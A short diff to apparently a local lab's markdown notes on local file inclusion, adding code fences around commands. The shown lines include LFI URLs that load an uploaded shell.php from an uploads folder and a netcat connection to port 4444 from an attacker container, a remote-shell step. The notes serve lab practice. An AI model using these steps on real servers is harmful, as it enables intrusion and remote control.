@@ -31,8 +31,11 @@ http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check
 
 - upload shell.php
 http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/shell
+
+```
 docker exec -ti <containerid_attackerserver> /bin/bash
 nc 172.18.0.1 4444
+```
 
 ## JSP
 
